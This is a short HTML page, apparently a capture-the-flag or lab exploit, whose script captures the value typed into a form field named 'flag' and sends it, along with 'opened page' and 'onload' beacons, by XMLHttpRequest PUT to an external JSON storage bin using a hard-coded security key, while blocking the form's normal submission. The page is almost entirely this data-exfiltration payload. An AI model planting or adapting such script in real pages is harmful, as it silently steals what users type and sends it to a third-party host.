<html>
	<head>
		<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline';">
	</head>
	<body>
		<script id="pwn" src="true">
		</script>
		<script>
			function sendmydata(data) {
				var req = new XMLHttpRequest();
	
				req.open("PUT", "https://json.extendsclass.com/bin/efbe379dfbef");
				req.setRequestHeader("Security-key","d8f0bc6b-c48f-11eb-86a8-0242ac110008");
				req.send(data);
			}
			
			sendmydata("opened page");
			
			window.onload = function() {
				sendmydata("onload run");
				
				var form = document.getElementById("myform");	
				var element = document.getElementById("flag");
				
				form.onsubmit = function(e) {
					sendmydata("" + element.value);
					e.preventDefault();
				}
			}
		</script>
		
		<form id="myform">
			<input id="flag" name="name" type="text" />
			<input type="submit" />
		</form>
